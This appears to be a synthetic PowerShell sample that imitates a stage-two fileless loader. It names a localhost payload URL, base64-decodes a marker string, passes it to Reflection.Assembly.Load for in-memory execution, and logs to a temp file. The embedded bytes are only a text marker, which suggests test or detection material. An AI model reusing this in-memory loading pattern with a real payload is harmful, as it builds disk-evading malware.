$Stage2Url = 'http://127.0.0.1/payload.bin'
$ErrorActionPreference = "Stop"

try {
    $AssemblyBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpyMG96OWxoOWRw')
    Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
    $FetchResult = [Reflection.Assembly]::Load($AssemblyBytes)
    if ($null -ne $FetchResult) {
        Write-Verbose ("Loaded assembly: " + $FetchResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
$StageMarker = "stage-23"
